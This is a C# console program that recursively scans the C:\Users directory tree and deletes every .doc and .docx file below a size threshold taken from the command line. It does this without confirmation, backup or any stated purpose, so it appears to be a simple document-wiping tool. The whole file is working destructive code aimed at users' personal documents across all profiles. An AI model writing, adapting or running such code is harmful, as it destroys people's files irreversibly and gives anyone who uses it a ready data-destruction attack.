using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace RD1
{
    class Program
    {
        List<Regex> regexes;
        long max;
        public Program(string argZ) {
            Regex reg1 = new Regex(@"^.*\.doc$", RegexOptions.IgnoreCase);
            Regex reg2 = new Regex(@"^.*\.docx$", RegexOptions.IgnoreCase);
            this.regexes = new List<Regex>();
            this.regexes.Add(reg1);
            this.regexes.Add(reg2);
            this.max = System.Convert.ToInt64(argZ);
            DirSearch(@"C:\Users");
        }

        public void DirSearch(string dir)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir)) {
                    // For every file 
                    try
                    {
                        FileInfo info = new FileInfo(file);
                        string fileName = Path.GetFileName(file);
                        foreach (Regex Re in regexes)
                        {
                            // If it is a Doc/Docx file
                            if (Re.Match(fileName).Success)
                            {
                                // If the size is > # 
                                long fileLength = info.Length;
                                Console.WriteLine(fileLength.ToString());
                                if (max > fileLength)
                                {
                                    // Example:
                                    // If max is 2000000000 and file is 1176776 -> True 
                                    // If max is 1000000000 and file is 1176776 -> False 
                                    try
                                    {
                                        // Delete the file 
                                        File.Delete(file);
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine(ex.Message);
                                    }

                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        continue;
                    }
                }
                    
                foreach (string d in Directory.GetDirectories(dir))
                {
                    Console.WriteLine(d);
                    DirSearch(d);
                }

            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }


        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("No args");
            }
            try
            {
                Program p = new Program(args[0]);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

    }
}